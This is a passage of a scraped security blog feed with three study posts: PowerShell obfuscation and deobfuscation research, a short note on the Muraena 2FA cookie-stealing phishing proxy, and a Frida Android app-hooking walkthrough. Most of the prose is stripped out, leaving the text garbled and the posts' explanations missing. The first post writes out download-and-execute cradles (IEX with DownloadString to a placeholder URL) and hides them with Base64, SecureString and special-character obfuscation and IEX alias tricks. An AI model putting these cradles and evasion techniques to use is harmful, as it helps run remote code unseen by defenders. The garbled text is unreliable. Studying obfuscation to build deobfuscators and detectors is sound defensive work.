title="base64"></a>base64</h3><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)</span><br></pre></td></tr></table></figure><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$command = &quot;(New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)&quot;</span><br><span class="line">$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) </span><br><span class="line">$encodedCommand = [Convert]::ToBase64String($bytes) </span><br><span class="line">powershell.exe -EncodedCommand $encodedCommand</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;<code>SecureStringToBSTR</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)</span><br></pre></td></tr></table></figure><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cmd = &quot;Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)&quot;</span><br><span class="line">$secCmd = ConvertTo-SecureString $cmd -AsPlainText -Force</span><br><span class="line">$secCmdPlaintext = $secCmd | CovertFrom-SecureString -Key (1..16)</span><br><span class="line">$secCmd = $secCmdPlaintext | ConvertTo-SecureString -Key (1..16)</span><br><span class="line">([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secCmd))) | IEX</span><br></pre></td></tr></table></figure><h3 id="IEX"><a href="#IEX" class="headerlink" title="IEX"></a>IEX</h3><ul><li>IEX<code>Invoke-Expression</code><code>&amp;(GAL I*X)</code></li><li>command<code>Command I*e-E*</code></li><li><code>$ExecutionContext.InvokeCommand.GetCmdlets(&#39;I*e-E*&#39;)</code></li><li>/</li></ul><p><img src="/images/ps-obfuscation/image-20231016141807602.png" alt="image-20231016141807602" style="zoom:67%;" /></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;<code>Invoke-Obfuscation</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$!-&#125;  =+  $(  )  ;$&#123;;<span class="regexp">/=&#125;  =$&#123;$!-&#125;;$&#123;-&#125;=  ++  $&#123;$!-&#125;  ;$&#123;/</span>&#125;  =++$&#123;$!-&#125;;$&#123;(&#125;  =  ++  $&#123;$!-&#125;;$&#123;#&#125;=  ++$&#123;$!-&#125;;$&#123;.&#125;  =++  $&#123;$!-&#125;  ;$&#123;)@&#125;  =  ++  $&#123;$!-&#125;  ;$&#123;!&#125;  =++$&#123;$!-&#125;  ;$&#123;;~+&#125;=  ++  $&#123;$!-&#125;;$&#123;@&#125;=++$&#123;$!-&#125;  ;$&#123;[$ &#125;  =<span class="string">&quot;[&quot;</span>+  <span class="string">&quot;$(  @&#123;&#125;  )&quot;</span>[  $&#123;!&#125;]  +<span class="string">&quot;$(@&#123;&#125;)&quot;</span>[<span class="string">&quot;$&#123;-&#125;&quot;</span>+<span class="string">&quot;$&#123;@&#125;&quot;</span>]+<span class="string">&quot;$(@&#123;  &#125;)  &quot;</span>[<span class="string">&quot;$&#123;/&#125;&quot;</span>  +<span class="string">&quot;$&#123;;/=&#125;&quot;</span>  ]+<span class="string">&quot;$?&quot;</span>[$&#123;-&#125;  ]+<span class="string">&quot;]&quot;</span>;$&#123;$!-&#125;=<span class="string">&quot;&quot;</span>.(<span class="string">&quot;$(@&#123;&#125;  )  &quot;</span>[  <span class="string">&quot;$&#123;-&#125;$&#123;#&#125;&quot;</span>]  +  <span class="string">&quot;$(  @&#123;  &#125;  )  &quot;</span>[<span class="string">&quot;$&#123;-&#125;$&#123;)@&#125;&quot;</span>]+  <span class="string">&quot;$(  @&#123;&#125;)&quot;</span>[$&#123;;<span class="regexp">/=&#125;]+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;#&#125;]  +  &quot;$?&quot;[  $&#123;-&#125;  ]  +&quot;$(@&#123;  &#125;)  &quot;[$&#123;(&#125;]);$&#123;$!-&#125;=  &quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;$&#123;#&#125;&quot;  ]+  &quot;$(  @&#123;&#125;)&quot;[  $&#123;#&#125;]  +  &quot;$&#123;$!-&#125;&quot;[  &quot;$&#123;/&#125;$&#123;!&#125;&quot;]  ;.$&#123;$!-&#125;(  &quot;$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;@&#125;+  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;!&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;/=&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;.&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;#&#125;+$&#123;[$ &#125;$&#123;(&#125;$&#123;/&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;;/=&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;~+&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;/&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;/&#125;+  $&#123;[$ &#125;$&#123;.&#125;$&#123;)@&#125;|  $&#123;$!-&#125;  &quot;  )</span></span><br></pre></td></tr></table></figure><p>1<code>;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$!-&#125;  =+  $(  )  ;</span><br><span class="line">$&#123;;/=&#125;  =$&#123;$!-&#125;;</span><br><span class="line">$&#123;-&#125;=  ++  $&#123;$!-&#125;  ;</span><br><span class="line">$&#123;/&#125;  =++$&#123;$!-&#125;;</span><br><span class="line">$&#123;(&#125;  =  ++  $&#123;$!-&#125;;</span><br><span class="line">$&#123;#&#125;=  ++$&#123;$!-&#125;;</span><br><span class="line">$&#123;.&#125;  =++  $&#123;$!-&#125;  ;</span><br><span class="line">$&#123;)@&#125;  =  ++  $&#123;$!-&#125;  ;</span><br><span class="line">$&#123;!&#125;  =++$&#123;$!-&#125;  ;</span><br><span class="line">$&#123;;~+&#125;=  ++  $&#123;$!-&#125;;</span><br><span class="line">$&#123;@&#125;=++$&#123;$!-&#125;  ;</span><br><span class="line">$&#123;[$ &#125;  =&quot;[&quot;+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;!&#125;]  +&quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;&quot;+&quot;$&#123;@&#125;&quot;]+&quot;$(@&#123;  &#125;)  &quot;[&quot;$&#123;/&#125;&quot;  +&quot;$&#123;;/=&#125;&quot;  ]+&quot;$?&quot;[$&#123;-&#125;  ]+&quot;]&quot;;</span><br><span class="line">$&#123;$!-&#125;=&quot;&quot;.(&quot;$(@&#123;&#125;  )  &quot;[  &quot;$&#123;-&#125;$&#123;#&#125;&quot;]  +  &quot;$(  @&#123;  &#125;  )  &quot;[&quot;$&#123;-&#125;$&#123;)@&#125;&quot;]+  &quot;$(  @&#123;&#125;)&quot;[$&#123;;/=&#125;]+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;#&#125;]  +  &quot;$?&quot;[  $&#123;-&#125;  ]  +&quot;$(@&#123;  &#125;)  &quot;[$&#123;(&#125;]);</span><br><span class="line">$&#123;$!-&#125;=  &quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;$&#123;#&#125;&quot;  ]+  &quot;$(  @&#123;&#125;)&quot;[  $&#123;#&#125;]  +  &quot;$&#123;$!-&#125;&quot;[  &quot;$&#123;/&#125;$&#123;!&#125;&quot;]  ;</span><br><span class="line">.$&#123;$!-&#125;(  &quot;$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;@&#125;+  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;!&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;/=&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;.&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;#&#125;+$&#123;[$ &#125;$&#123;(&#125;$&#123;/&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;;/=&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;~+&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;/&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;/&#125;+  $&#123;[$ &#125;$&#123;.&#125;$&#123;)@&#125;|  $&#123;$!-&#125;  &quot;  )</span><br></pre></td></tr></table></figure><p>212</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$!-&#125; = 8</span><br><span class="line">$&#123;;/=&#125; = 0</span><br><span class="line">$&#123;-&#125;   = 1</span><br><span class="line">$&#123;/&#125;   = 2</span><br><span class="line">$&#123;(&#125;   = 3</span><br><span class="line">$&#123;#&#125;   = 4</span><br><span class="line">$&#123;.&#125;   = 5</span><br><span class="line">$&#123;)@&#125;  = 6</span><br><span class="line">$&#123;!&#125;   = 7</span><br><span class="line">$&#123;;~+&#125; = 8</span><br><span class="line">$&#123;@&#125;   = 9</span><br></pre></td></tr></table></figure><p>3<code>&quot;$(@&#123;&#125;)&quot;</code><code>System.Collections.Hashtable</code><code>&quot;$?&quot;</code><code>True</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;[$ &#125; = &quot;[&quot;+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;!&#125;]  +&quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;&quot;+&quot;$&#123;@&#125;&quot;]+&quot;$(@&#123;  &#125;)  &quot;[&quot;$&#123;/&#125;&quot;  +&quot;$&#123;;/=&#125;&quot;  ]+&quot;$?&quot;[$&#123;-&#125;  ]+&quot;]&quot;</span><br><span class="line">       = &quot;[&quot; + &quot;System.Collections.Hashtable&quot;[7] + &quot;System.Collections.Hashtable&quot;[19] + &quot;System.Collections.Hashtable&quot;[20] + &quot;True&quot;[1] + &quot;]&quot;</span><br><span class="line">       = &quot;[Char]&quot;</span><br></pre></td></tr></table></figure><p>&emsp;<code>$&#123;$!-&#125;=iex</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.iex(mkdir onlyf8 | iex)</span><br></pre></td></tr></table></figure><p>BlobRunnershellcode</p><h2 id="powershell-"><a href="#powershell-" class="headerlink" title="powershell "></a>powershell </h2><h4 id="ASTInvoke-Deobfuscation-"><a href="#ASTInvoke-Deobfuscation-" class="headerlink" title="ASTInvoke-Deobfuscation "></a>ASTInvoke-Deobfuscation </h4><p>&emsp;<code></code></p><p>&emsp;<code></code>PowerDecodeAST</p><p>&emsp;<code></code>3<code></code>Invoke-Expression</p><p>&emsp;<code></code></p><p>&emsp;Invoke-Deobfuscation1 AST 23AST</p><p>&emsp;Invoke-DeobfuscationTokenAST</p><h5 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h5><p>&emsp;Microsoft<code>System.Management.Automation.PSParser</code>psTokenTokenToken</p><p><img src="/images/ps-obfuscation/image-20231015184907321.png" alt="image-20231015184907321" style="zoom:67%;" /></p><p>&emsp;TokenIeXInvoke-ExpressionTokenToken<code>Token</code></p><h5 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h5><p>&emsp;<code></code></p><p>1</p><p>&emsp;<code> PowerShell AST </code>PowerShellASThe+llohelloPowerShell ASTPipelineAstUnaryExpressionAstBinaryExpressionAstConvertExpressionAstInvokeMemberExpressionAstSubExpressionAst <code></code></p><p>2</p><p>&emsp;<code>Invoke</code>Restart-ComputerStart-Sleep</p><p>3</p><p>&emsp;<code></code><code></code>ASTNamedblockAstIfStatementAstWhileStatementAstForStatementAstForEachStatementAstStatementBlockAst</p><p>&emsp; AssignmentStatement </p><p>4Invoke-Expression  PowerShell</p><p>&emsp;<code></code>Invoke-Expression cmdletPowerShellInvoke-ExpressionPowerShell<code>.($pshome[4]+$pshome[30]+&quot;x&quot;)</code>Invoke-Expression<code>.(&quot;iex&quot;)</code>Invoke-ExpressionInvoke-Expression<code>iex</code><code>&quot;xxx&quot;|iex</code><code>&amp;&quot;iex&quot;</code></p><p>&emsp;PowerShell<code>-EncodedCommand</code>Base64PowerShell<code></code>-e-eNc<code>&quot;-encodedcommand&quot;.StartsWith($param)</code><code>-EncodedCommand</code></p><p>5</p><p>&emsp; AST <code></code> AST </p><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>&emsp;<code></code></p><p>1Hayden37.4%32%42%</p><p>2GitHub4234PowerShell70% 2%10% </p><p>3<code>var_&#123;num&#125;</code><code>func_&#123;num&#125;</code></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&emsp;powershellpsps</p><h4 id="PowerDrive-"><a href="#PowerDrive-" class="headerlink" title="PowerDrive-"></a>PowerDrive-</h4><p><img src="/images/ps-obfuscation/image-20231016135538877.png" alt="image-20231016135538877" style="zoom:67%;" /></p><p>&emsp;PowerDrive<code></code>4</p><ul><li>ASCII</li><li>12Invoke-Expression</li><li>sleeptry-catch</li><li>Invoke-WebRequest Invoke-RestNew-Object</li></ul><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&emsp;File Status Classifiercleanup</p><p><img src="/images/ps-obfuscation/image-20231016151347423.png" alt="image-20231016151347423" style="zoom:67%;" /></p><h5 id="-Status-Classifier"><a href="#-Status-Classifier" class="headerlink" title=" Status Classifier"></a> Status Classifier</h5><p>&emsp;123</p><p>&emsp;1github ps</p><p>&emsp;2LSTM</p><h5 id="-De-encoder"><a href="#-De-encoder" class="headerlink" title=" De-encoder"></a> De-encoder</h5><p>&emsp;</p><h5 id="-Deobfuscator"><a href="#-Deobfuscator" class="headerlink" title=" Deobfuscator"></a> Deobfuscator</h5><p>&emsp;</p><p>&emsp;<code>-f</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. -f-F</span><br><span class="line">2. -f&#123;[0-9]+&#125;</span><br><span class="line">3. -f</span><br><span class="line">4. </span><br><span class="line">5. </span><br></pre></td></tr></table></figure><h5 id="-Cleanup-Network"><a href="#-Cleanup-Network" class="headerlink" title=" Cleanup Network"></a> Cleanup Network</h5><p>&emsp;Cleanup Network<code>MOdULEDiRectORy</code>Seq2Seq</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. </span><br><span class="line">2. </span><br><span class="line">3. </span><br><span class="line">4. </span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>1Flerken</p><p>2powershellprofiler</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>[1] <a href="https://rootclay.gitbook.io/powershell-attack-guide/jin-jie-pian/9.-hun-xiao">https://rootclay.gitbook.io/powershell-attack-guide/jin-jie-pian/9.-hun-xiao</a></p><p>[2] <a href="https://onlyf8.com//powershell-obfuscationEN">https://onlyf8.com//powershell-obfuscationEN</a></p><p>[3] <a href="https://www.secrss.com/articles/52662">https://www.secrss.com/articles/52662</a></p><p>[4] <a href="https://www.ctfiot.com/41643.html">https://www.ctfiot.com/41643.html</a></p><p>[5] <a href="https://www.secrss.com/articles/20119">https://www.secrss.com/articles/20119</a></p><p>[6] <a href="https://xz.aliyun.com/t/2923">https://xz.aliyun.com/t/2923</a></p><p>[7] <a href="https://cloud.tencent.com/developer/article/1639161">https://cloud.tencent.com/developer/article/1639161</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;powershell&quot;&gt;&lt;a href=&quot;#powershell&quot; class=&quot;headerlink&quot; title=&quot;powershell&quot;&gt;&lt;/a&gt;powershell&lt;/h1&gt;&lt;p&gt;&amp;emsp;powershell&lt;code&gt;.net&lt;/code&gt;ps&lt;code&gt;DownloadString&lt;/code&gt;//&lt;code&gt;&lt;/code&gt;&lt;code&gt;Marshall&lt;/code&gt;&lt;code&gt;&lt;/code&gt;psWindows APIPowerShell&lt;/p&gt;</summary>
    
    
    
    <category term="study-notes" scheme="https://wd-2711.tech/categories/study-notes/"/>
    
    
  </entry>
  
  <entry>
    <title>muraen-source-code-reading</title>
    <link href="https://wd-2711.tech/2023/10/13/muraen-source-code-reading/"/>
    <id>https://wd-2711.tech/2023/10/13/muraen-source-code-reading/</id>
    <published>2023-10-13T10:27:13.000Z</published>
    <updated>2023-10-18T06:14:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="muraen-"><a href="#muraen-" class="headerlink" title="muraen-"></a>muraen-</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>&emsp;web2FA<code></code><code>cookie</code></p><span id="more"></span><p>&emsp; (Subresource IntegritySRI)  (Content Security PolicyCSP) <code></code>Muraena</p><h2 id="Muraena"><a href="#Muraena" class="headerlink" title="Muraena"></a>Muraena</h2><p>&emsp;Lets Encrypt<code>web</code><code></code><code></code>webJSON</p><p>&emsp;Muraena</p><p>12FAcookiecookie</p><p>2MuraenacookieNecroBrowserNecroBrowsercookie<br>NecroBrowserAPIDockerChromiumcookie</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>&emsp;</p><p>&emsp;<a href="https://github.com/WD-2711/muraena">https://github.com/WD-2711/muraena</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;muraen-&quot;&gt;&lt;a href=&quot;#muraen-&quot; class=&quot;headerlink&quot; title=&quot;muraen-&quot;&gt;&lt;/a&gt;muraen-&lt;/h1&gt;&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&amp;emsp;web2FA&lt;code&gt;&lt;/code&gt;&lt;code&gt;cookie&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="go" scheme="https://wd-2711.tech/categories/go/"/>
    
    
  </entry>
  
  <entry>
    <title>frida-reverse-analysis-2</title>
    <link href="https://wd-2711.tech/2023/10/09/frida-reverse-analysis-2/"/>
    <id>https://wd-2711.tech/2023/10/09/frida-reverse-analysis-2/</id>
    <published>2023-10-09T10:34:44.000Z</published>
    <updated>2023-10-22T08:59:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Frida-2"><a href="#Frida-2" class="headerlink" title="Frida-2"></a>Frida-2</h1><p>&emsp;frida</p><span id="more"></span><h2 id="0x03-FridaApp"><a href="#0x03-FridaApp" class="headerlink" title="0x03 FridaApp"></a>0x03 FridaApp</h2><p>&emsp;fridatraceobjectionZentracerJava.chooseapp</p><h3 id="app"><a href="#app" class="headerlink" title="app"></a>app</h3><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&emsp;<strong></strong></p><p>&emsp;appHttps<strong></strong>app<strong></strong></p><p>&emsp;</p><p>1wifi</p><p><img src="/images/frida-reverse-analysis-2/image-20231009213402929.png" alt="image-20231009213402929" style="zoom:67%;" /></p><p>&emsp;ahttpwebsocketbapp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(&quot;http.proxyHost&quot;)</span><br></pre></td></tr></table></figure><p>2vpnpostern</p><p><img src="/images/frida-reverse-analysis-2/image-20231009230301580.png" alt="image-20231009230301580" style="zoom:67%;" /></p><p>&emsp;linuxcharles</p><p><img src="/images/frida-reverse-analysis-2/image-20231009231938941.png" alt="image-20231009231938941" style="zoom:67%;" /></p><p>&emsp;movetv.apk</p><p><img src="/images/frida-reverse-analysis-2/image-20231009234020487.png" alt="image-20231009234020487" style="zoom:67%;" /></p><p><img src="/images/frida-reverse-analysis-2/image-20231009234104412.png" alt="image-20231009234104412" style="zoom:67%;" /></p><h4 id="-"><a href="#-" class="headerlink" title="/"></a>/</h4><p>&emsp;namepassloginloginkeyrightkeymemi1</p><p>&emsp;<code></code><strong></strong><code></code></p><p>&emsp;<code></code>buttonviewhook viewonClickonClickhookEvent.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jclazz = <span class="literal">null</span></span><br><span class="line"><span class="keyword">var</span> jobj = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getObjClassName</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!jclazz)&#123;</span><br><span class="line">        <span class="keyword">var</span> jclazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Class&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!jobj)&#123;</span><br><span class="line">        <span class="keyword">var</span> jobj = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Object&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jclazz.<span class="property">getName</span>.<span class="title function_">call</span>(jobj.<span class="property">getClass</span>.<span class="title function_">call</span>(obj))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">watch</span>(<span class="params">obj, mtdName</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> listener_name = <span class="title function_">getObjClassName</span>(obj)</span><br><span class="line">    <span class="keyword">var</span> target = <span class="title class_">Java</span>.<span class="title function_">use</span>(listener_name)</span><br><span class="line">    <span class="comment">// target should have onClick method</span></span><br><span class="line">    <span class="keyword">if</span>(!target || !mtdName <span class="keyword">in</span> target)&#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    target[mtdName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[WatchEvent] &quot;</span> + mtdName + <span class="string">&quot;: &quot;</span> + <span class="title function_">getObjClassName</span>(<span class="variable language_">this</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>[mtdName].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">OnClickListener</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// start in spawn mode</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.view.View&quot;</span>).<span class="property">setOnClickListener</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">listener</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(listener != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="title function_">watch</span>(listener, <span class="string">&#x27;onClick&#x27;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setOnClickListener</span>(listener)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// start in attach mode</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;android.view.View$ListenerInfo&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                instance = instance.<span class="property">mOnClickListener</span>.<span class="property">value</span></span><br><span class="line">                <span class="keyword">if</span>(instance)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mOnClickListener : &quot;</span> + <span class="title function_">getObjClassName</span>(instance))</span><br><span class="line">                    <span class="title function_">watch</span>(instance, <span class="string">&#x27;onClick&#x27;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(<span class="title class_">OnClickListener</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//  app </span><br><span class="line">frida -U -F -l hookEvent.js</span><br></pre></td></tr></table></figure><p>&emsp;</p><p><img src="/images/frida-reverse-analysis-2/image-20231010110906554.png" alt="image-20231010110906554" style="zoom:67%;" /></p><p>&emsp;<code>com.cz.babySister.activity.LoginActivity</code></p><p>&emsp;<a href="https://www.isisy.com/1420.html"></a></p><p><img src="/images/frida-reverse-analysis-2/image-20231010112211340.png" alt="image-20231010112211340" style="zoom:67%;" /></p><p>&emsp;<code>frida_dexdump</code><code>frida_fart|FART</code>frida_dexdump<a href="https://github.com/hluwa/frida-dexdump"></a>5dexdex3</p><p><img src="/images/frida-reverse-analysis-2/image-20231010115547318.png" alt="image-20231010115547318" style="zoom:67%;" /></p><p>&emsp;b()objectionb()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.cz.babySister explore</span><br><span class="line">android hooking watch class_method com.cz.babySister.activity.LoginActivity.b --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><p>&emsp;</p><p><img src="/images/frida-reverse-analysis-2/image-20231010120458729.png" alt="image-20231010120458729" style="zoom:80%;" /></p><p>&emsp;b()q()nop</p><p><img src="/images/frida-reverse-analysis-2/image-20231010125607830.png" alt="image-20231010125607830" style="zoom:67%;" /></p><p>&emsp;<a href="https://blog.csdn.net/zhangmiaoping23/article/details/52160473"></a>frida_fart<a href="https://blog.51cto.com/u_15101562/2622401"></a>movetv.apksd</p><p><img src="/images/frida-reverse-analysis-2/image-20231010152911816.png" alt="image-20231010152911816" style="zoom:67%;" /></p><p>&emsp;v5keyv6rightkeyv4memi1</p><p><img src="/images/frida-reverse-analysis-2/image-20231010153119863.png" alt="image-20231010153119863" style="zoom:67%;" /></p><p><img src="/images/frida-reverse-analysis-2/image-20231010153237044.png" alt="image-20231010153237044" style="zoom:67%;" /></p><p><img src="/images/frida-reverse-analysis-2/image-20231010153542277.png" alt="image-20231010153542277" style="zoom:67%;" /></p><p>&emsp;v5keyappv6rightkeyappv4memi1android_idappkeyrightkeymemi1</p><p>&emsp;app<strong>python</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 